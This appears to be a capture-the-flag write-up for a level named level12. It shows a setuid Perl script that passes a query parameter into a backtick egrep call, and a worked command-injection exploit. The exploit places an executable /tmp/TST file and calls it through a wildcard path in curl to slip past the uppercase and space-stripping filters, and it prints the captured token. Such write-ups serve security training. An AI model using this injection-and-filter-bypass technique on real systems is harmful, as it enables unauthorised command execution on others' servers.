```sh
$> ls -l ~/
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

$> cat level12.pl
[...]
	$xx = $_[0];
	$xx =~ tr/a-z/A-Z/;
	$xx =~ s/\s.*//;
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
[...]
```

The code is vulnerable to a command injection.  
We have two regex:
- uppercase all the letters
- remove all the spaces

Because of that, we cannot use `getflag > /tmp/tok` for example.  
We can try to inject a file that is executable and that will match those two conditions instead

```sh
$> echo 'getflag > /tmp/tok' > /tmp/TST

$> chmod +x /tmp/TST

$> curl localhost:4646?x='`/*/TST`'

$> cat /tmp/tok
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
